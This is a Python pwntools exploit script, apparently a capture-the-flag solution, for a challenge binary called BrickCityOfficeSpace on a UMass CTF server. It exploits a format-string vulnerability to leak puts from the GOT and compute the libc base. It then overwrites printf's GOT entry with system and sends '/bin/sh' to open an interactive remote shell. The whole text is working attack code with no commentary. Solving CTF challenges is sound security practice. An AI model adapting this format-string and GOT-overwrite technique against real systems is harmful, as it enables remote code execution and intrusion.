from pwn import *
elf_name = './BrickCityOfficeSpace_patched'
libc_name = './libc.so.6'
elf = ELF(elf_name)
libc = ELF(libc_name)
p = remote('brick-city-office-space.pwn.ctf.umasscybersec.org' , 45001)

offset = 4
puts_got = elf.got['puts']
payload_leak = p32(puts_got) + f"%{offset}$s".encode()

p.sendlineafter(b"BrickCityOfficeSpace> ", payload_leak)
p.recvuntil(p32(puts_got))

leaked_puts_raw = p.recv(4)
leaked_puts_addr = u32(leaked_puts_raw)
libc.address = leaked_puts_addr - libc.symbols['puts']

system_addr = libc.symbols['system']

p.sendlineafter(b"Would you like to redesign? (y/n)\n", b"y")
printf_got = elf.got['printf']
payload_write = fmtstr_payload(offset, {printf_got: system_addr}, write_size='short')
p.sendlineafter(b"BrickCityOfficeSpace> ", payload_write)
p.sendlineafter(b"Would you like to redesign? (y/n)\n", b"y")
p.sendlineafter(b"BrickCityOfficeSpace> ", b"/bin/sh")

p.interactive()